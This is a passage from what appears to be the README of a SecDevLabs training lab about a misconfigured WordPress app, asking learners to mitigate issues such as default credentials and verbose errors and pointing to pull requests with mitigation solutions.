below:\\n\\n &lt;p align=\"center\"&gt;\\n    &lt;img src=\"images/attack9.png\"/&gt;\\n&lt;/p&gt;\\n\\n---\\n\\n## Secure this app\\n\\nHow would you mitigate this vulnerability? After your changes, an attacker should not be able to:\\n\\n- See verbose error messages\\n- Sign in with default credentials\\n- See verbose tokens\\n- Find an outdated CMS version\\n\\nNote: In this particular app, due to how it works, you can simply write down the changes you would make to mitigate those vulnerabilities and submit it as a pull request.\\n\\n## PR solutions\\n\\n[Spoiler alert 🚨] To understand how this vulnerability can be mitigated, check out [these pull requests](https://github.com/globocom/secDevLabs/pulls?q=is%3Apr+label%3A%22mitigation+solution+%F0%9F%94%92%22+label%3A%22Vuln+Wordpress+Misconfig%22)!\\n\\n## Contributing\\n\\nWe encourage you to contribute to SecDevLabs!
